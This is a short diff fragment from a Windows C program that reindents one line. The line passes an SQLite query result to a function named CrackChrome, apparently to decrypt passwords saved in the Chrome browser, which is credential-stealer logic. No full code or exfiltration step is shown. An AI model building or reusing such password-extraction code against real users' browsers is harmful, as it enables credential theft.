@@ -61,6 +61,6 @@ int APIENTRY WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance,
     if (crypt32() == TRUE)
     {
         /* many code later ... */
-        char *password = CrackChrome((BYTE *)sqlite3_column_text(stmt, 2));
+    		char *password = CrackChrome((BYTE *)sqlite3_column_text(stmt, 2));
     }
 }
